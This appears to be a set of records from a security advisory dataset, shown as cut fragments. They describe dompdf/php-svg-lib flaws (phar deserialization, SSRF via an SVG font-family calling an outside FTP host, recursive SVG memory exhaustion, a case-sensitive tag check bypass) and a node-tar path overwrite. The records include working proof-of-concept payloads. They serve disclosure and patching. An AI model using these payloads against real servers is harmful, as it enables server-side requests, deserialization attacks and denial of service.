On other versions, it might be used as a way to get a SSRF through, for example, ftp, not restricted by authorized protocols configured on dompdf.\n\n### Details\nThe problem lies on the `openFont` function of the `lib/Cpdf.php` library, when the `$font` variable passed by php-svg-lib isn't checked correctly. A path is crafted through $name and $dir, which are two values that can be controlled through CSS : \n\n```\n$name = basename($font);\n$dir = dirname($font);\n[...]\n$metrics_name = \"$name.ufm\";\n[...]\n\nif (!isset($this->fonts[$font]) && file_exists(\"$dir/$metrics_name\")) {\n```\n\nPassing a font named `phar:///foo/bar/baz.phar/test` will set the value of $name to `test` and $dir to `phar:///foo/bar/baz.phar`, which once reconstructed will call file_exists on `phar:///foo/bar/baz.phar/test.ufm`. That allows to deserialize the `baz.phar` arbitrary file that contains a `test.ufm` file in the archive.\n\n\n### PoC\n\nConsider the following, minimal PHP code : \n\n```\n<?php\nrequire('vendor/autoload.php');\n\nuse Dompdf\\Dompdf;\n$dompdf = new Dompdf();\n$dompdf->loadHtml($_GET['payload']);\n$dompdf->setPaper('A4', 'landscape');\n$options = $dompdf->getOptions();\n$options->setAllowedProtocols([]);\n$dompdf->render();\n$dompdf->stream();\n```\n\nWith payload being this html file : \n\n```\n<html>\n<img src=\"data:image/png;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj4NCiAgICA8dGV4dCB4PSIyMCIgeT0iMzUiIHN0eWxlPSJjb2xvcjpyZWQ7Zm9udC1mYW1pbHk6ZnRwOi8vYmxha2wuaXM6MjEveC95OyI+TXk8L3RleHQ+DQo8L3N2Zz4=\"></img>\n</html>\n```\n\nwith the base64 image being : \n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n\t\t<text x=\"20\" y=\"35\" style=\"color:red;font-family:ftp://blakl.is:21/x/y;\">My</text>\n</svg>\n```\n\nA connection on ftp://blakl.is:21/ will occur, bypassing the allowed protocols.\n\n### Impact\nAn attacker might be able to exploit the vulnerability to call arbitrary URL with arbitrary protocols, if they can force dompdf to parse a SVG with an inline CSS property using a malicious font-family.

One of the validations is that the [SVG document does not reference itself](https://github.com/dompdf/dompdf/blob/v2.0.3/src/Image/Cache.php#L136-L153). However, a recursive chained using two or more SVG documents is not correctly validated. Depending on the system configuration and attack pattern this could exhaust the memory available to the executing process and/or to the server itself.\n\n### Details\nphp-svg-lib, when run in isolation, does not support SVG references for `image` elements. An SVG document can, however, be referenced and Dompdf will run that reference through the same validation.

Depending on the system configuration and attack pattern this could exhaust the memory available to the executing process and/or to the server itself.\n\n### Details\nInside `Svg\\Tag\\UseTag::before`, php-svg-lib parses the attributes passed to an `use` tag inside an svg document. When it finds a `href` or `xlink:href`, it will try to retrieve the object representing this tag:\n\n```\n$link = $attributes[\"href\"] ?? $attributes[\"xlink:href\"];\n$this->reference = $document->getDef($link);\n\nif ($this->reference) {\n\t\t$this->reference->before($attributes);\n}\n```\n\n`$document->getDef` is implemented as follow:\n\n```\npublic function getDef($id) {\n\t\t$id = ltrim($id, \"#\");\n\n\t\treturn isset($this->defs[$id]) ? $this->defs[$id] : null;\n}\n```\n\n_Note:_ the `$id` in the above method is actually the _link_ being used in `use` tag. This part is important, because this behaviour\there actually leads to the vulnerability. It will be mentioned later on in this report.\n\nIf it finds the referenced object, it will try to call the `before` method on the referenced object (this is still inside `Svg\\Tag\\UseTag::before`) :\n\n```\nif ($this->reference) {\n\t\t$this->reference->before($attributes);\n}\n```\n\nIn order to cause an infinte loop, we need to be able to control the `$id` used in the `$this->defs[$id]` code above. This `defs` property (`Svg\\Document::defs`) is being populated when `Svg\\Document::_tagStart` is called. This is the handler being used when the php-svg-lib is parsing the svg structure:\n\n```\n// Svg\\Document line 343\nif ($tag) {\n\t\tif (isset($attributes[\"id\"])) {\n\t\t\t\t$this->defs[$attributes[\"id\"]] = $tag;\n\t\t}\n\t\telse {\n\t\t\t\t// ...\n\t\t}\n\n\t\t// ...\n}\n```\n\nSo if the `use` tag contains an `id`, then that `use` tag will be added to the `$defs` array with it's `id` as the key.\n\nNow as noted before, when there is a link inside the `use` tag, the library uses that link as the `id` to actually find the object or `tag` that has been added to the `Svg\\Document::defs`.\n\nSo if the `id` attribute is equal to the link attribute inside the `use` tag, then the referenced object (in this case it is the `Use` tag object) will be called recursively until the memory given to the script is exhausted.\n\n### PoC\n\nThis is an example svg file that can be used to demonstrate the vulnerability.\n\n```\n<svg width=\"200\" height=\"200\"\n\txmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\t<use id=\"selfref\" xlink:href=\"#selfref\" />\n</svg>\n```\n\n### Impact\n\nWhen the lib parses the above payload, it will crash:\n\n```\nPHP Fatal error:\tAllowed memory size of 536870912 bytes exhausted (tried to allocate 262144 bytes) in /xxx/dompdf/vendor/phenx/php-svg-lib/src/Svg/Tag/UseTag.php on line 37\n```\n\nAn attacker sending multiple request to a system to render the above payload can potentially cause resource exhaustion to the point that the system is unable to handle incoming request.", "related_urls": ["https://github.com/dompdf/php-svg-lib/security/advisories/GHSA-ff5x-7qg5-vwf2", "https://nvd.nist.gov/vuln/detail/CVE-2023-50251", "https://github.com/dompdf/php-svg-lib/commit/88163cbe562d9b391b3a352e54d9c89d02d77ee0", "https://github.com/dompdf/php-svg-lib"], "occurrence_count": 0, "reachable_flows": 0}

This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`. \n\nThis logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths. When given an absolute file path with repeating path roots, the resulting path (e.g. `///home/user/.bashrc`) would still resolve to an absolute path, thus allowing arbitrary file creation and overwrite. \n\n### Patches\n\n3.2.2 || 4.4.14 || 5.0.6 || 6.1.1\n\nNOTE: an adjacent issue [CVE-2021-32803](https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw) affects this release level. Please ensure you update to the latest patch levels that address CVE-2021-32803 as well if this adjacent issue affects your `node-tar` use case.\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom `onentry` method which sanitizes the `entry.path` or a `filter` method which removes entries with absolute paths.\n\n```js\nconst path = require('path')\nconst tar = require('tar')\n\ntar.x({\n\tfile: 'archive.tgz',\n\t// either add this function...\n\tonentry: (entry) => {\n\t\tif (path.isAbsolute(entry.path)) {\n\t\t\tentry.path = sanitizeAbsolutePathSomehow(entry.path)\n\t\t\tentry.absolute = path.resolve(entry.path)\n\t\t}\n\t},\n\n\t// or this one\n\tfilter: (file, entry) => {\n\t\tif (path.isAbsolute(entry.path)) {\n\t\t\treturn false\n\t\t} else {\n\t\t\treturn true\n\t\t}\n\t}\n})\n```\n\nUsers are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.", "related_urls": ["https://github.com/npm/node-tar/security/advisories/GHSA-3jfq-g458-7qm9", "https://nvd.nist.gov/vuln/detail/CVE-2021-32804", "https://github.com/npm/node-tar/commit/1f036ca23f64a547bdd6c79c1a44bc62e8115da4", "https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf", "https://github.com/npm/node-tar", "https://www.npmjs.com/advisories/1770", "https://www.npmjs.com/package/tar", "https://www.oracle.com/security-alerts/cpuoct2021.html"], "occurrence_count": 0, "reachable_flows": 0}

This might leads to arbitrary object unserialize on PHP < 8, through the `phar` URL wrapper.\n\n### Details\nThe bug occurs during SVG parsing of `<image>` tags, in src/Image/Cache.php : \n\n```\nif ($type === \"svg\") {\n\t\t$parser = xml_parser_create(\"utf-8\");\n\t\txml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, false);\n\t\txml_set_element_handler(\n\t\t\t\t$parser,\n\t\t\t\tfunction ($parser, $name, $attributes) use ($options, $parsed_url, $full_url) {\n\t\t\t\t\t\tif ($name === \"image\") {\n\t\t\t\t\t\t\t\t$attributes = array_change_key_case($attributes, CASE_LOWER);\n```\nThis part will try to detect `<image>` tags in SVG, and will take the href to validate it against the protocolAllowed whitelist. However, the `$name comparison with \"image\" is case sensitive, which means that such a tag in the SVG will pass : \n\n```\n<svg>\n\t\t<Image xlink:href=\"phar:///foo\"></Image>\n</svg>\n```\n\nAs the tag is named \"Image\" and not \"image\", it will not pass the condition to trigger the check.\n\nA correct solution would be to strtolower the `$name` before the check : \n\n```\nif (strtolower($name) === \"image\") {\n```\n\n### PoC\nParsing the following SVG file is sufficient to reproduce the vulnerability :\n\n```\n<svg>\n\t\t<Image xlink:href=\"phar:///foo\"></Image>\n</svg>\n```\n\n### Impact\nAn attacker might be able to exploit the vulnerability to call arbitrary URL with arbitrary protocols, if they can provide a SVG file to dompdf. In PHP versions before 8.0.0, it leads to arbitrary unserialize, that will leads at the very least to an arbitrary file deletion, and might leads to remote code execution, depending on classes that are available.", "related_urls": ["https://github.com/dompdf/dompdf/security/advisories/GHSA-3cw5-7cxw-v5qg", "https://nvd.nist.gov/vuln/detail/CVE-2023-23924", "https://github.com/dompdf/dompdf/commit/7558f07f693b2ac3266089f21051e6b78c6a0c85", "https://github.com/FriendsOfPHP/security-advisories/blob/master/dompdf/dompdf/CVE-2023-23924.yaml", "https://github.com/advisories/GHSA-3cw5-7cxw-v5qg", "https://github.com/dompdf/dompdf", "https://github.com/dompdf/dompdf/releases/tag/v2.0.2"], "occurrence_count": 0, "reachable_flows": 0}
